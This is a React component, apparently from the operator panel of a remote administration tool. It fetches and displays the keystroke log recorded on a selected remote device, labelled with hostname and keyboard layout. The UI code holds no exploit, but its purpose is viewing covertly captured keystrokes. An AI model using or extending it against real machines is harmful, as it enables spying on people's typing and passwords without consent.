import React, { useState, useEffect } from 'react';
import DraggableModal from "../modal";

const Keylog = (props) => {
    const hostname = props.device.hostname;
    const [data, setData] = useState(null);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState(null);
    const [modalVisible, setModalVisible] = useState(false);
    const [draggable, setDraggable] = useState(true);

    const fetchData = async () => {
        setLoading(true);
        setError(null);
        try {
            const formData = new FormData();
            formData.append('device', props.device.id);
            const response = await fetch('/api/device/keylog', {
                method: 'POST',
                body: formData
            });
            if (!response.ok) {
                throw new Error('Failed to fetch data');
            }
            const result = await response.json();
            setData(result.data.log);
        } catch (err) {
            setError(err.message);
        } finally {
            setLoading(false);
        }
    };

    // Fetch data when the modal is opened
    useEffect(() => {
        setData(null);
        fetchData();
    }, []);

    const handleRefresh = () => {
        setData(null);
        fetchData();
    };
    function getKeyboardLayout() {
        var layout = props.device.keyboardlayout
        if (!Number.isInteger(layout)) {
            const parsed = parseInt(layout, 10);
            if (!isNaN(parsed)) {
                layout = parsed;
            }
        }
        if (Number.isInteger(layout)) {
            const layoutMapping = {
                1033: 'us',
                2057: 'gb',
                1031: 'de',
                1036: 'fr',
                1040: 'it',
                1043: 'nl',
                1045: 'pl',
                1048: 'ro',
                1030: 'da',
                1032: 'gr',
                1034: 'es',
                1035: 'fi',
                1038: 'hu',
                1044: 'no',
                1046: 'pt',
                1049: 'ru',
                1050: 'hr',
                1051: 'sk',
                1053: 'se',
                1055: 'tr',
                1059: 'is',
                1026: 'bg',
                1029: 'cs',
                1061: 'et',
                1060: 'si',
                // add other mappings as needed
            };
            return layoutMapping[layout] || layout;
        }
        return layout;
    }
    return (
        <DraggableModal
            modalProps={{
                destroyOnClose: true,
                maskClosable: true,
            }}
            draggable={draggable}
            modalTitle={'Keylog - layout: ' + getKeyboardLayout() + ' - ' + hostname}
            onVisibleChange={open => {
                if (!open) props.onCancel();
            }}
            onCancel={() => {
                setModalVisible(false);
                setData(null);
            }}
            onClose={() => {
                setModalVisible(false);
                setData(null);
            }}
            footer={null}
            width={830}
            bodyStyle={{
                padding: 0
            }}
            {...props}
        >
            <div style={{ height: '400px', overflow: 'auto' }}>
                {loading && <div>Loading...</div>}
                {error && <div>Error: {error}</div>}
                {data && <pre>{data}</pre>}
            </div>
            <div style={{ textAlign: 'center', padding: '10px 0' }}>
                <button onClick={handleRefresh}>Refresh</button>
            </div>
        </DraggableModal>
    );
};

export default Keylog;